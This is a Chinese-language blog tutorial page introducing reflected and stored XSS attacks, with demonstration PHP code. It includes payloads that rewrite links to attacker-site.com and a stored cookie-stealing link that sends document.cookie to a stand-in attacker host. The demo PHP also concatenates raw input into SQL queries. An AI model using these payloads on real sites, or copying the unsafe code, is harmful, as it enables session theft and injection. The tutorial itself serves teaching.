@@ -1,0 +1,770 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Linux安全," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;xss表示Cross Site Scripting(跨站脚本攻击)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户游览器的控制。 &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;">
+<meta name="keywords" content="Linux安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss攻击入门">
+<meta property="og:url" content="https://hcldirgit.github.io/2017/09/03/Linux安全/11. xss攻击入门/index.html">
+<meta property="og:site_name" content="失落的乐章">
+<meta property="og:description" content="&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;xss表示Cross Site Scripting(跨站脚本攻击)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户游览器的控制。 &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-09-01T08:54:32.602Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xss攻击入门">
+<meta name="twitter:description" content="&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;xss表示Cross Site Scripting(跨站脚本攻击)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户游览器的控制。 &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://hcldirgit.github.io/2017/09/03/Linux安全/11. xss攻击入门/"/>
+
+
+
+
+
+  <title>xss攻击入门 | 失落的乐章</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', '85*****1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?87980c**************99ec5e26fb5";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">失落的乐章</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">技术面前，永远都是学生。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-message">
+          <a href="/message" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-external-link"></i> <br />
+            
+            留言
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://hcldirgit.github.io/2017/09/03/Linux安全/11. xss攻击入门/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="失落的乐章">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/0.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="失落的乐章">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">xss攻击入门</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-03T02:04:46+08:00">
+                2017-09-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;xss表示Cross Site Scripting(跨站脚本攻击)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户游览器的控制。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;xss攻击可以分成两种类型：</p>
+<ul>
+<li>非持久型攻击</li>
+<li>持久型攻击</li>
+</ul>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面我们通过具体例子，了解两种类型xss攻击。</p>
+<h2 id="1-非持久型xss攻击"><a href="#1-非持久型xss攻击" class="headerlink" title="1.非持久型xss攻击"></a>1.非持久型xss攻击</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;顾名思义，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假设有以下index.php页面：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">'name'</span>];</div><div class="line"><span class="built_in">echo</span> <span class="string">"Welcome <span class="variable">$name</span>&lt;br&gt;"</span>;</div><div class="line"><span class="built_in">echo</span> <span class="string">"&lt;a href="</span>http://www.cnblogs.com/bangerlee/<span class="string">"&gt;Click to Download&lt;/a&gt;"</span>;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该页面显示两行信息：</p>
+<ul>
+<li>从URI获取 ‘name’ 参数，并在页面显示</li>
+<li>显示跳转到一条URL的链接</li>
+</ul>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时，当攻击者给出以下URL链接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?name=guest&lt;script&gt;alert(<span class="string">'attacked'</span>)&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当用户点击该链接时，将产生以下html代码，带’attacked’的告警提示框弹出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Welcome guest</div><div class="line">&lt;script&gt;alert(<span class="string">'attacked'</span>)&lt;/script&gt;</div><div class="line">&lt;br&gt;</div><div class="line">&lt;a href=<span class="string">'http://www.cnblogs.com/bangerlee/'</span>&gt;Click to Download&lt;/a&gt;</div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了插入alert代码，攻击者还可以通过以下URL实现修改链接的目的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">index.php?name=</div><div class="line">&lt;script&gt;</div><div class="line">window.onload = <span class="function"><span class="title">function</span></span>() &#123;</div><div class="line">var link=document.getElementsByTagName(<span class="string">"a"</span>);link[0].href=<span class="string">"http://attacker-site.com/"</span>;&#125;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当用户点击以上攻击者提供的URL时，index.php页面被植入脚本，页面源码如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Welcome </div><div class="line">&lt;script&gt;</div><div class="line">window.onload = <span class="function"><span class="title">function</span></span>() &#123;</div><div class="line">var link=document.getElementsByTagName(<span class="string">"a"</span>);link[0].href=<span class="string">"http://attacker-site.com/"</span>;&#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;br&gt;</div><div class="line">&lt;a href=<span class="string">'http://www.cnblogs.com/bangerlee/'</span>&gt;Click to Download&lt;/a&gt;</div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户再点击 “Click to Download” 时，将跳转至攻击者提供的链接。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于用于攻击的URL，攻击者一般不会直接使用以上可读形式，而是将其转换成ASCII码，以下URL同样用于实现链接地址变更：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?name=%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2d%73%69%74%65%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e</div></pre></td></tr></table></figure>
+<h2 id="2-持久型xss攻击"><a href="#2-持久型xss攻击" class="headerlink" title="2.持久型xss攻击"></a>2.持久型xss攻击</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;持久型xss攻击会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。下面来看一个利用持久型xss攻击获取session id的实例。</p>
+<h2 id="session背景知识"><a href="#session背景知识" class="headerlink" title="session背景知识"></a>session背景知识</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们知道HTTP是一个无状态维持的协议，所有请求/应答都是独立的，其间不保存状态信息。但有些场景下我们需要维护状态信息，例如用户登录完web应用后，再一定时间内，用户再进行登录，应不需要再输入用户名/密码进行鉴权。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时我们用cookie和session解决状态维护问题，当用户首次登入时，服务器为该用户创建一个 session ID，同时向游览器传送一个 cookie，cookie保存会话连接中用到的数据，session ID作为会话标识，游览器后续的请求均基于该session ID。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;攻击者可以提供一个攻击链接，当用户点击该链接时，向攻击者自己的服务器发送一条保存有用户session ID的信息，这样就可以窃取到用户的session ID，得到用户的执行权限。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现有以下login.php，其根据 user_name 在数据中查找相应的 pass_word，然后将用户提供的 password 与查数据库所得的 pass_word 进行比较，如果验证成功则创建对应于 user_name 的 session。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"><span class="variable">$Host</span>= <span class="string">'192.168.1.8'</span>;</div><div class="line"><span class="variable">$Dbname</span>= <span class="string">'app'</span>;</div><div class="line"><span class="variable">$User</span>= <span class="string">'yyy'</span>;</div><div class="line"><span class="variable">$Password</span>= <span class="string">'xxx'</span>;</div><div class="line"><span class="variable">$Schema</span> = <span class="string">'test'</span>;</div><div class="line"></div><div class="line"><span class="variable">$Conection_string</span>=<span class="string">"host=<span class="variable">$Host</span> dbname=<span class="variable">$Dbname</span> user=<span class="variable">$User</span> password=<span class="variable">$Password</span>"</span>;</div><div class="line"></div><div class="line">/* Connect with database asking <span class="keyword">for</span> a new connection*/</div><div class="line"><span class="variable">$Connect</span>=pg_connect(<span class="variable">$Conection_string</span>,<span class="variable">$PGSQL_CONNECT_FORCE_NEW</span>);</div><div class="line"></div><div class="line">/* Error checking the connection string */</div><div class="line"><span class="keyword">if</span> (!<span class="variable">$Connect</span>) &#123;</div><div class="line"> <span class="built_in">echo</span> <span class="string">"Database Connection Failure"</span>;</div><div class="line"> <span class="built_in">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="variable">$query</span>=<span class="string">"SELECT user_name,password from <span class="variable">$Schema</span>.members where user_name='"</span>.<span class="variable">$_POST</span>[<span class="string">'user_name'</span>].<span class="string">"';"</span>;</div><div class="line"></div><div class="line"><span class="variable">$result</span>=pg_query(<span class="variable">$Connect</span>,<span class="variable">$query</span>);</div><div class="line"><span class="variable">$row</span>=pg_fetch_array(<span class="variable">$result</span>,NULL,PGSQL_ASSOC);</div><div class="line"></div><div class="line"><span class="variable">$user_pass</span> = md5(<span class="variable">$_POST</span>[<span class="string">'pass_word'</span>]);</div><div class="line"><span class="variable">$user_name</span> = <span class="variable">$row</span>[<span class="string">'user_name'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(strcmp(<span class="variable">$user_pass</span>,<span class="variable">$row</span>[<span class="string">'password'</span>])!=0) &#123;</div><div class="line"> <span class="built_in">echo</span> <span class="string">"Login failed"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line"> <span class="comment"># Start the session</span></div><div class="line"> session_start();</div><div class="line"> <span class="variable">$_SESSION</span>[<span class="string">'USER_NAME'</span>] = <span class="variable">$user_name</span>;</div><div class="line"> <span class="built_in">echo</span> <span class="string">"&lt;head&gt; &lt;meta http-equiv=\"Refresh\" content=\"0;url=home.php\" &gt; &lt;/head&gt;"</span>;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另有以下home.php，其根据登入的用户是 admin 还是其他用户，显示不同内容，对于admin，其列出所有用户，对于其他用户，提供包含输入框的form，可在数据库中插入新的用户名信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">session_start();</div><div class="line"><span class="keyword">if</span>(!<span class="variable">$_SESSION</span>[<span class="string">'USER_NAME'</span>]) &#123;</div><div class="line"> <span class="built_in">echo</span> <span class="string">"Need to login"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line"> <span class="variable">$Host</span>= <span class="string">'192.168.1.8'</span>;</div><div class="line"> <span class="variable">$Dbname</span>= <span class="string">'app'</span>;</div><div class="line"> <span class="variable">$User</span>= <span class="string">'yyy'</span>;</div><div class="line"> <span class="variable">$Password</span>= <span class="string">'xxx'</span>;</div><div class="line"> <span class="variable">$Schema</span> = <span class="string">'test'</span>;</div><div class="line"> <span class="variable">$Conection_string</span>=<span class="string">"host=<span class="variable">$Host</span> dbname=<span class="variable">$Dbname</span> user=<span class="variable">$User</span> password=<span class="variable">$Password</span>"</span>;</div><div class="line"> <span class="variable">$Connect</span>=pg_connect(<span class="variable">$Conection_string</span>,<span class="variable">$PGSQL_CONNECT_FORCE_NEW</span>);</div><div class="line"> <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</div><div class="line">  <span class="variable">$query</span>=<span class="string">"update <span class="variable">$Schema</span>.members set display_name='"</span>.<span class="variable">$_POST</span>[<span class="string">'disp_name'</span>].<span class="string">"' where user_name='"</span>.<span class="variable">$_SESSION</span>[<span class="string">'USER_NAME'</span>].<span class="string">"';"</span>;</div><div class="line">  pg_query(<span class="variable">$Connect</span>,<span class="variable">$query</span>);</div><div class="line">  <span class="built_in">echo</span> <span class="string">"Update Success"</span>;</div><div class="line"> &#125;</div><div class="line"> <span class="keyword">else</span> &#123;</div><div class="line">  <span class="keyword">if</span>(strcmp(<span class="variable">$_SESSION</span>[<span class="string">'USER_NAME'</span>],<span class="string">'admin'</span>)==0) &#123;</div><div class="line">   <span class="built_in">echo</span> <span class="string">"Welcome admin&lt;br&gt;&lt;hr&gt;"</span>;</div><div class="line">   <span class="built_in">echo</span> <span class="string">"List of user's are&lt;br&gt;"</span>;</div><div class="line">   <span class="variable">$query</span> = <span class="string">"select display_name from <span class="variable">$Schema</span>.members where user_name!='admin'"</span>;</div><div class="line">   <span class="variable">$res</span> = pg_query(<span class="variable">$Connect</span>,<span class="variable">$query</span>);</div><div class="line">   <span class="keyword">while</span>(<span class="variable">$row</span>=pg_fetch_array(<span class="variable">$res</span>,NULL,PGSQL_ASSOC)) &#123;</div><div class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$row</span>[display_name]&lt;br&gt;"</span>;</div><div class="line">   &#125;</div><div class="line"> &#125;</div><div class="line"> <span class="keyword">else</span> &#123;</div><div class="line">  <span class="built_in">echo</span> <span class="string">"&lt;form name=\"tgs\" id=\"tgs\" method=\"post\" action=\"home.php\"&gt;"</span>;</div><div class="line">  <span class="built_in">echo</span> <span class="string">"Update display name:&lt;input type=\"text\" id=\"disp_name\" name=\"disp_name\" value=\"\"&gt;"</span>;</div><div class="line">  <span class="built_in">echo</span> <span class="string">"&lt;input type=\"submit\" value=\"Update\"&gt;"</span>;</div><div class="line"> &#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意以上场景中，对 admin 和其他用户进行了不同的权限设置，admin可以看到所有用户列表，下面我们来看如何获取 admin 的session ID，从而使得其他用户也能获得 admin 的权限。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，攻击者以一个普通用户登录进来，然后在输入框中提交以下数据：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=<span class="comment"># onclick=\"document.location=\'http://attacker-site.com/xss.php?c=\'+escape\(document.cookie\)\;\"&gt;bangerlee&lt;/a&gt;</span></div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;攻击者提交了条带<a>标签的数据，该条数据将保存在数据库中，而当 admin 用户登入时，包含 “bangerlee” 的用户列表将显示，如果 admin 用户点击 “bangerlee” 时，在 “attacker-site.com” 所在的服务器上，攻击者就可以窃取到 admin 的session-id：</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xss.php?c=PHPSESSID%3Dvmcsjsgear6gsogpu7o2imr9f3</div></pre></td></tr></table></figure>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有了该session-id，攻击者在会话有效期内即可获得 admin 用户的权限，并且由于攻击数据已添加入数据库，只要攻击数据未被删除，那么攻击还有可能生效，是持久性的。</p>
+<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然，不是只有持久型xss攻击才能窃取session ID、用户的cookie信息，用非持久型xss也可以，只要引导用户点击某链接，将 document.cookie 信息传到指定服务器即可，以上仅作为说明持久型xss攻击的举例。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Linux安全/" rel="tag"># Linux安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/03/Linux安全/10. root账户不允许远程登陆/" rel="next" title="root账户不允许远程登陆">
+                <i class="fa fa-chevron-left"></i> root账户不允许远程登陆
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/09/03/Linux安全/12. 防止SQL注入/" rel="prev" title="防止SQL注入">
+                防止SQL注入 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/0.png"
+               alt="失落的乐章" />
+          <p class="site-author-name" itemprop="name">失落的乐章</p>
+           
+              <p class="site-description motion-element" itemprop="description">失落的乐章的Blog</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/">
+                <span class="site-state-item-count">599</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">37</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/hcldirgit" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-非持久型xss攻击"><span class="nav-number">1.</span> <span class="nav-text">1.非持久型xss攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-持久型xss攻击"><span class="nav-number">2.</span> <span class="nav-text">2.持久型xss攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#session背景知识"><span class="nav-number">3.</span> <span class="nav-text">session背景知识</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">失落的乐章</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+
